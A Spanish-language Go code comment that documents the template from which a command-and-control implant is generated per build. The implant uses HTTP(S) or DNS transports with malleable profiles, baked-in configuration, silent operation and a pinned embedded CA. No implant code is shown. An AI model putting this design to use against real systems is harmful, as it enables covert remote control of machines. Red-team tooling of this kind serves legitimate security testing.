// implantTemplate es el esqueleto del archivo main.go que se genera para
// cada build. Despacha en runtime según el esquema de ListenerURL:
//
//   - http://  o https://  → transporte HTTP(S) con perfil maleable HTTP
//   - dns://               → transporte DNS con perfil maleable DNS
//
// Inyecta la configuración como constantes de paquete para que el
// compilador las hornee en el binario.
//
// DEBUG: define RTC2_DEBUG=1 en el entorno del implante para que emita
// logs de diagnóstico a stderr. Sin esa variable, el implante es silencioso.
//
// TLS: la CA del server (CACertPEMBase64) se incrusta en el binario.
// El implante confía exclusivamente en esa CA, no en el trust store del
// sistema operativo. Esto evita MITM por CAs instaladas en el host.
//
// IMPORTANTE: este es el ÚNICO lugar donde vive el código del implante.
// No existe un cmd/implant/main.go paralelo; el implante se genera
// dinámicamente en cada build. Cualquier cambio de comportamiento debe
// hacerse aquí.
